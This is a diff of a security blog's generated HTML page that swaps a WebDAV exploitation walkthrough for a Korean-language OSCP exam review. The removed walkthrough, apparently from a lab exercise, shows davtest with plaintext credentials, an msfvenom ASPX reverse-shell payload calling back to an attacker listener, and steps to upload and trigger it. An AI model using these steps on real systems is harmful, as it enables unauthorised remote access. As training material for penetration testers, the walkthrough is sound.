@@ -5,37 +5,45 @@
     <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
     <meta name="generator" content="Hugo 0.164.0">
     <meta name="generator" content="Relearn 9.0.3+36307e4ed23582638ab689240ac7b427217803ee">
-    <meta name="description" content="WebDAV ExploitationWebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.
-WebDAV typically requires credentials to interact with.
-Step 1 — Enumerate Allowed File Types with davtestdavtest tests which file types can be uploaded and executed on the target WebDAV server.">
+    <meta name="description" content="OSCP 후기이번에 드디어 OSCP에 합격했다.
+결과는 70점으로 stand alone 머신 3대 (60점) &#43; AD (10점)으로 합격했다.
+저번에 떨어졌을 때는 60점이었고, AD (40점) &#43; stand alone (10점)이었다.
+이번에도 저번처럼 AD가 쉽고 standalone 머신이 어려울 줄 알았는데 상상도 못한 패턴으로 합격했다.
+Background우선 내 백그라운드를 설명하는게 좋을 것 같다.">
     <meta name="author" content="">
     <meta name="twitter:card" content="summary">
-    <meta name="twitter:title" content="WebDAV Exploitation with davtest :: Zenu">
-    <meta name="twitter:description" content="WebDAV ExploitationWebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.
-WebDAV typically requires credentials to interact with.
-Step 1 — Enumerate Allowed File Types with davtestdavtest tests which file types can be uploaded and executed on the target WebDAV server.">
-    <meta property="og:url" content="http://localhost:1313/posts/webdav/index.html">
+    <meta name="twitter:title" content="OSCP review :: Zenu">
+    <meta name="twitter:description" content="OSCP 후기이번에 드디어 OSCP에 합격했다.
+결과는 70점으로 stand alone 머신 3대 (60점) &#43; AD (10점)으로 합격했다.
+저번에 떨어졌을 때는 60점이었고, AD (40점) &#43; stand alone (10점)이었다.
+이번에도 저번처럼 AD가 쉽고 standalone 머신이 어려울 줄 알았는데 상상도 못한 패턴으로 합격했다.
+Background우선 내 백그라운드를 설명하는게 좋을 것 같다.">
+    <meta property="og:url" content="http://localhost:1313/posts/misc/oscp_review/index.html">
     <meta property="og:site_name" content="Zenu">
-    <meta property="og:title" content="WebDAV Exploitation with davtest :: Zenu">
-    <meta property="og:description" content="WebDAV ExploitationWebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.
-WebDAV typically requires credentials to interact with.
-Step 1 — Enumerate Allowed File Types with davtestdavtest tests which file types can be uploaded and executed on the target WebDAV server.">
+    <meta property="og:title" content="OSCP review :: Zenu">
+    <meta property="og:description" content="OSCP 후기이번에 드디어 OSCP에 합격했다.
+결과는 70점으로 stand alone 머신 3대 (60점) &#43; AD (10점)으로 합격했다.
+저번에 떨어졌을 때는 60점이었고, AD (40점) &#43; stand alone (10점)이었다.
+이번에도 저번처럼 AD가 쉽고 standalone 머신이 어려울 줄 알았는데 상상도 못한 패턴으로 합격했다.
+Background우선 내 백그라운드를 설명하는게 좋을 것 같다.">
     <meta property="og:locale" content="en_us">
     <meta property="og:type" content="article">
     <meta property="article:section" content="Posts">
-    <meta property="article:published_time" content="2026-04-15T17:59:18+09:00">
-    <meta property="article:modified_time" content="2026-04-15T17:59:18+09:00">
-    <meta property="article:tag" content="Webdav">
-    <meta property="article:tag" content="Davtest">
-    <meta itemprop="name" content="WebDAV Exploitation with davtest :: Zenu">
-    <meta itemprop="description" content="WebDAV ExploitationWebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.
-WebDAV typically requires credentials to interact with.
-Step 1 — Enumerate Allowed File Types with davtestdavtest tests which file types can be uploaded and executed on the target WebDAV server.">
-    <meta itemprop="datePublished" content="2026-04-15T17:59:18+09:00">
-    <meta itemprop="dateModified" content="2026-04-15T17:59:18+09:00">
-    <meta itemprop="wordCount" content="230">
-    <meta itemprop="keywords" content="Webdav,Davtest">
-    <title>WebDAV Exploitation with davtest :: Zenu</title>
+    <meta property="article:published_time" content="2026-08-22T23:22:16+09:00">
+    <meta property="article:modified_time" content="2026-08-22T23:22:16+09:00">
+    <meta property="article:tag" content="Oscp">
+    <meta property="article:tag" content="Oscp&#43;">
+    <meta itemprop="name" content="OSCP review :: Zenu">
+    <meta itemprop="description" content="OSCP 후기이번에 드디어 OSCP에 합격했다.
+결과는 70점으로 stand alone 머신 3대 (60점) &#43; AD (10점)으로 합격했다.
+저번에 떨어졌을 때는 60점이었고, AD (40점) &#43; stand alone (10점)이었다.
+이번에도 저번처럼 AD가 쉽고 standalone 머신이 어려울 줄 알았는데 상상도 못한 패턴으로 합격했다.
+Background우선 내 백그라운드를 설명하는게 좋을 것 같다.">
+    <meta itemprop="datePublished" content="2026-08-22T23:22:16+09:00">
+    <meta itemprop="dateModified" content="2026-08-22T23:22:16+09:00">
+    <meta itemprop="wordCount" content="564">
+    <meta itemprop="keywords" content="Oscp,Oscp&#43;">
+    <title>OSCP review :: Zenu</title>
     <link href="/images/favicon.png?1788184190" rel="icon" type="image/png">
     <link href="/images/favicon.ico?1788184190" rel="icon" type="image/x-icon" sizes="any">
     <link href="/css/auto-complete/auto-complete.min.css?1788184190" rel="stylesheet">
@@ -62,9 +70,9 @@ Step 1 — Enumerate Allowed File Types with davtestdavtest tests which file ty
       window.relearn = window.relearn || {};
       // configuration
       window.relearn.min = ``;
-      window.relearn.path='\/posts\/webdav\/index.html';
-      window.relearn.relBasePath='..\/..';
-      window.relearn.relBaseUri='..\/..';
+      window.relearn.path='\/posts\/misc\/oscp_review\/index.html';
+      window.relearn.relBasePath='..\/..\/..';
+      window.relearn.relBaseUri='..\/..\/..';
       window.relearn.absBaseUri='http:\/\/localhost:1313';
       window.relearn.disableInlineCopyToClipboard=false;
       window.relearn.enableBlockCodeWrap=true;
@@ -107,7 +115,7 @@ Step 1 — Enumerate Allowed File Types with davtestdavtest tests which file ty
       window.relearn.markVariant();
     </script>
   </head>
-  <body class="mobile-support html" data-origin="/posts/webdav/index.html">
+  <body class="mobile-support html" data-origin="/posts/misc/oscp_review/index.html">
     <div id="R-body" class="default-animation">
       <div id="R-body-overlay"></div>
       <nav id="R-topbar" class="default-animation">
@@ -123,24 +131,26 @@ Step 1 — Enumerate Allowed File Types with davtestdavtest tests which file ty
                 <div class="topbar-content-wrapper">
 <nav class="TableOfContents">
   <ul>
-    <li><a href="#step-1--enumerate-allowed-file-types-with-davtest">Step 1 — Enumerate Allowed File Types with davtest</a></li>
-    <li><a href="#step-2--generate-a-reverse-shell-payload">Step 2 — Generate a Reverse Shell Payload</a></li>
-    <li><a href="#step-3--upload-the-payload">Step 3 — Upload the Payload</a></li>
-    <li><a href="#step-4--trigger-the-shell">Step 4 — Trigger the Shell</a></li>
+    <li><a href="#background">Background</a></li>
+    <li><a href="#시험-난이도">시험 난이도</a></li>
+    <li><a href="#리포트">리포트</a></li>
+    <li><a href="#개인적인-생각">개인적인 생각</a></li>
+    <li><a href="#팁">팁?</a></li>
+    <li><a href="#다음-자격증">다음 자격증</a></li>
   </ul>
 </nav>
                 </div>
               </div>
             </div>
           </div>
-          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Home</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/posts/index.html"><span itemprop="name">Posts</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">WebDAV Exploitation with davtest</span><meta itemprop="position" content="3"></li>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Home</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/posts/index.html"><span itemprop="name">Posts</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/posts/misc/index.html"><span itemprop="name">Misc</span></a><meta itemprop="position" content="3">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">OSCP review</span><meta itemprop="position" content="4"></li>
           </ol>
           <div class="topbar-area topbar-area-end" data-area="end">
             <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
-<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/ad/rbcd/index.html" title="GenericAll permission on a domain computer (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/misc/index.html" title="Misc (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
             </div>
             <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
-<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/pivoting/index.html" title="Pivoting (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/webshell/index.html" title="Webshell (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
             </div>
             <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
 <span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
@@ -162,50 +172,72 @@ Step 1 — Enumerate Allowed File Types with davtestdavtest tests which file ty
 <div class="R-taxonomy taxonomy-tags cstyle tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
   <i class="fa-fw fas fa-layer-group"></i>
   <ul>
-    <li><a class="term-link" href="/tags/davtest/index.html">Davtest</a></li>
-    <li><a class="term-link" href="/tags/webdav/index.html">Webdav</a></li>
+    <li><a class="term-link" href="/tags/oscp/index.html">Oscp</a></li>
+    <li><a class="term-link" href="/tags/oscp&#43;/index.html">Oscp&#43;</a></li>
   </ul>
 </div>
   </header>
 
-<h1 id="webdav-exploitation-with-davtest">WebDAV Exploitation with davtest</h1>
+<h1 id="oscp-review">OSCP review</h1>
 
-<h1 id="webdav-exploitation">WebDAV Exploitation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
-<p>WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.</p>
-<p>WebDAV typically requires <strong>credentials</strong> to interact with.</p>
-<h2 id="step-1--enumerate-allowed-file-types-with-davtest">Step 1 — Enumerate Allowed File Types with davtest<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<p><code>davtest</code> tests which file types can be uploaded and executed on the target WebDAV server.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122</span></span></code></pre></div>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>Created: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.shtml
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jsp
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jhtml
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cgi
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cfm
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.pl
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html
-PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.php
-Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt
-Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx
-Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp
-Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html</code></pre></div>
-<p>The output shows both <code>.aspx</code> and <code>.asp</code> are executable — meaning we can upload a web shell or reverse shell payload in either format.</p>
-<h2 id="step-2--generate-a-reverse-shell-payload">Step 2 — Generate a Reverse Shell Payload<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<p>Using <code>msfvenom</code>, generate an ASPX reverse shell:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o rev.aspx LHOST<span style="color:#f92672">=</span>192.168.45.212 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span></span></span></code></pre></div>
-<h2 id="step-3--upload-the-payload">Step 3 — Upload the Payload<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<p>Upload the payload using the directory that <code>davtest</code> created in step 1:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122</span></span></code></pre></div>
-<h2 id="step-4--trigger-the-shell">Step 4 — Trigger the Shell<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<p>With a listener ready, browse to the uploaded file to execute it:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/rev.aspx</code></pre></div>
-<p>The reverse shell connects back to the attacker machine.</p>
+<h1 id="oscp-후기">OSCP 후기<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p>이번에 드디어 OSCP에 합격했다.</p>
+<p>결과는 70점으로 stand alone 머신 3대 (60점) + AD (10점)으로 합격했다.</p>
+<p>저번에 떨어졌을 때는 60점이었고, AD (40점) + stand alone (10점)이었다.</p>
+<p>이번에도 저번처럼 AD가 쉽고 standalone 머신이 어려울 줄 알았는데 상상도 못한 패턴으로 합격했다.</p>
+<p><a href="#R-image-61c08eee06a55ed17dcb323cd8cd6432" class="lightbox-link"><img alt="oscp" class="lazy lightbox figure-image" loading="lazy" src="https://api.accredible.com/v1/frontend/credential_website_embed_image/certificate/191699323" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-61c08eee06a55ed17dcb323cd8cd6432"><img alt="oscp" class="lazy lightbox lightbox-image" loading="lazy" src="https://api.accredible.com/v1/frontend/credential_website_embed_image/certificate/191699323"></a></p>
+<h2 id="background">Background<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>우선 내 백그라운드를 설명하는게 좋을 것 같다.</p>
+<p>현재 일본의 보험회사에서 레드팀 멤버로 근무하고 있고, penetration tester의 경력은 1년 조금 넘었다.</p>
+<p>그 전까지는 SOC나 인프라, 웹 개발 업무들을 담당했었다.</p>
+<p>OSCP 전에 보유하고 있던 보안 관련 자격증은 CISSP, PJPT가 있고 자잘한 CVE가 3개 정도 있다.</p>
+<h2 id="시험-난이도">시험 난이도<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>어차피 시험의 내용이나 합격하기 위한 경우의 수 같은 정보는 많으니 바로 시험에 대해 얘기하려고 한다.</p>
+<p>나의 경험과 주변 OSCP 합격자들의 경험담으로 미루어볼 때 시험에 두가지 패턴이 있는 것 같다.</p>
+<ol>
+<li>AD가 쉽고 stand alone이 어려운 경우 (내가 저번에 떨어진 패턴)</li>
+<li>AD가 어렵고 stand alone이 쉬운 경우 (이번에 붙은 패턴)</li>
+</ol>
+<p>먼저 패턴 1부터 얘기하면, 저번 시험 때 AD는 너무 쉬웠다. Enumeration이 그렇게 어렵지도 않았고 어떻게 다음 공격으로 이어가야 할지 뻔히 보였다.</p>
+<p>실제로 AD의 플래그를 전부 획득하는데 (40점) 2-3시간 정도 걸렸던 것 같다.</p>
+<p>그런데 stand alone이 말도 안되게 어려웠다.</p>
+<p>1대는 user, root 플래그를 획득했는데, 나머지 2대는 초기진입도 못하고 끝났다.</p>
+<p>60점을 시험 시작하고 5시간 정도에 획득했는데, 그 땐 당연히 붙을 줄 알고 여유롭게 시험보다가 결국 그대로 끝나서 멘탈이 터졌었다.</p>
+<p>이번에 본 2번 째 패턴의 경우에는 정반대였다. AD 세트 먼저 시작했는데 처음 권한 상승 후에 (10점) 도저히 어떻게 풀어가야할지 알 수가 없었다.</p>
+<p>제대로 enumeration도 했다고 생각하는데 전혀 갈피를 잡을 수 없었다.</p>
+<p>그래서 처음부터 멘탈이 박살이 난 상태로 stand alone 머신으로 옮겨갔는데, 왠걸 너무나도 쉬웠다.</p>
+<p>rabbit hole도 없고 그냥 Easy 중에서도 쉬운 편의 머신들이었다.</p>
+<p>그렇게 막힘없이 연달아 3대를 다 풀었더니 70점이 되었고, AD를 좀 더 살펴봤지만 여전히 모르겠어서 시험을 끝내고 잠을 잤다.</p>
+<h2 id="리포트">리포트<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>시험이 끝나고 보고서를 쓰는데 점수가 딱 70점이라 여간 불안한게 아니었다.</p>
+<p>뭐가 잘못돼서 1점이라도 깎였다가는 그대로 떨어질 수 있기 때문이었다.</p>
+<p>그래서 심혈을 기울여 보고서를 작성했고, 공식 사이트에 나와있는대로 모든 스텝을 자세히 기록하려고 노력했다.</p>
+<p>그렇게 보고서를 제출하고 일주일 정도 지난 다음 합격했다는 메일을 받았다.</p>
+<p>다른 후기들은 대체로 3일내에 합격 메일을 받았다고 하던데, 일주일 기다리는 내내 굉장히 불안했었다.</p>
+<h2 id="개인적인-생각">개인적인 생각<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>이번에 시험에 붙고 느낀점은 운이 굉장히 중요한 요소라는 것이다.</p>
+<p>솔직히 첫번째 시험봤을 때랑 두번째 봤을 때랑 내 실력차이는 그렇게 크지 않았다.</p>
+<p>오히려 첫 도전 때가 훨씬 기합이 들어간 상태여서 더 좋은 컨디션이었을지도 모른다.</p>
+<p>내가 느끼기에 두 시험에서 크게 달랐던 점은 머신의 난이도였다.</p>
+<p>그러니 혹시 이걸 읽는 사람 중에 이미 시험에서 떨어진 경험이 있더라도 크게 실망하지 않기를 바란다.</p>
+<p>다음번에 머신 운이 좋으면 너무 간단히 합격할 수도 있기 때문이다.</p>
+<p>그렇다고 10점, 20점으로 떨어지면 곤란하다. 그럴 경우 아직 준비가 한참 부족한 상태일 수 있다.</p>
+<p>그리고 시험내내 나를 감시하는 그 프로그램에 대해 얘기를 안 할 수가 없는데, 이게 자꾸 버그가 걸렸다.</p>
+<p>시험치다가 쉬러가거나 밥을 먹으러가거나 아무튼 자리를 비울 때는 시험관에게 채팅으로 보고를 해야하는데, 계속 채팅이 보내지지 않아서 그냥 메모장에 메세지 적고 화면에 보이게 해놓고 쉬러갔었다.</p>
+<p>페이지를 새로고침하면 채팅 기능이 부활하기는 하는데, 그럼 다시 디스플레이 처음부터 공유해야되고 번거롭다.</p>
+<h2 id="팁">팁?<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>OSCP 시험의 팁이라고 한다면, 이 시험은 이론이 아닌 실기 시험이기 때문에 되도록 많은 머신을 풀어보는 게 당연히 중요하다.</p>
+<p>뻔하지만 본인의 체크리스트와 치트시트를 만들어 두면 바로바로 찾아서 써먹을 수 있어서 편하다.</p>
+<p>혹시 바로 OSCP에 도전하는게 어려워서 그보다 한단계 낮은 자격증부터 차근차근 도전하고 싶은 사람이 있다면 <a href="https://certifications.tcm-sec.com/pjpt/" rel="external">PJPT</a>라는 자격증을 추천하고 싶다.</p>
+<p>AD를 메인으로 다루는 자격증인데 OSCP의 AD머신의 내용과 거의 범위가 같고 강의 내용도 이해하는데 많은 도움이 됐다.</p>
+<h2 id="다음-자격증">다음 자격증<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>다음 자격증으로는 OSEP에 도전하기 전에 CRTO라는 자격증을 먼저 취득할 계획이다.</p>
+<p>이것도 AD가 메인인데, C2서버를 이용하고 최대한 감지되지 않도록 해킹을 해야한다고 한다.</p>
+<p>사실 지금 공부중인데, 다른 사람들은 쉽다고 하길래 느긋하게 할겸 시작했다가 생각보다 어려워서 고전중이다.</p>
 
   <footer class="footline">
-              <i class='fa-fw fas fa-calendar'></i> Apr 15, 2026
+              <i class='fa-fw fas fa-calendar'></i> Aug 22, 2026
   </footer>
 </article>
         </div>
@@ -249,11 +281,12 @@ Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.
         <div class="R-sidebarmenu R-shortcutmenu-main default-animation">
           <ul class="enlarge morespace collapsible-menu">
             <li class="parent " data-nav-id="/posts/index.html"><a class="padding default-animation" href="/posts/index.html"><i class="fa-solid fa-dog"></i> Posts<i class="fa-fw fas fa-check read-icon"></i></a><ul id="R-subsections-b4e55eb7e39db1aee6d02808a2267090" class="collapsible-menu">
-            <li class="alwaysopen " data-nav-id="/posts/misc/index.html"><a class="padding default-animation" href="/posts/misc/index.html">Misc<i class="fa-fw fas fa-check read-icon"></i></a><ul id="R-subsections-de134c6c6b23f6868c7c19472c5146e5" class="collapsible-menu"></ul></li>
+            <li class="parent alwaysopen " data-nav-id="/posts/misc/index.html"><a class="padding default-animation" href="/posts/misc/index.html">Misc<i class="fa-fw fas fa-check read-icon"></i></a><ul id="R-subsections-de134c6c6b23f6868c7c19472c5146e5" class="collapsible-menu">
+            <li class="active " data-nav-id="/posts/misc/oscp_review/index.html"><a class="padding" href="/posts/misc/oscp_review/index.html">OSCP review<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li>
             <li class="" data-nav-id="/posts/webshell/index.html"><a class="padding" href="/posts/webshell/index.html">Webshell<i class="fa-fw fas fa-check read-icon"></i></a></li>
             <li class="" data-nav-id="/posts/oscp_cheatsheet/index.html"><a class="padding" href="/posts/oscp_cheatsheet/index.html">Cheatsheet<i class="fa-fw fas fa-check read-icon"></i></a></li>
             <li class="alwaysopen " data-nav-id="/posts/ad/index.html"><a class="padding default-animation" href="/posts/ad/index.html">Active Directory<i class="fa-fw fas fa-check read-icon"></i></a><ul id="R-subsections-f4784161091e67b921ce9162ec1e6966" class="collapsible-menu"></ul></li>
-            <li class="active " data-nav-id="/posts/webdav/index.html"><a class="padding" href="/posts/webdav/index.html">WebDAV Exploitation with davtest<i class="fa-fw fas fa-check read-icon"></i></a></li>
+            <li class="" data-nav-id="/posts/webdav/index.html"><a class="padding" href="/posts/webdav/index.html">WebDAV Exploitation with davtest<i class="fa-fw fas fa-check read-icon"></i></a></li>
             <li class="" data-nav-id="/posts/pivoting/index.html"><a class="padding" href="/posts/pivoting/index.html">Pivoting<i class="fa-fw fas fa-check read-icon"></i></a></li>
             <li class="" data-nav-id="/posts/file-transfer/index.html"><a class="padding" href="/posts/file-transfer/index.html">File Transfer<i class="fa-fw fas fa-check read-icon"></i></a></li>
             <li class="" data-nav-id="/posts/revshell-upgrade/index.html"><a class="padding" href="/posts/revshell-upgrade/index.html">Stabilize a reverse shell<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li>
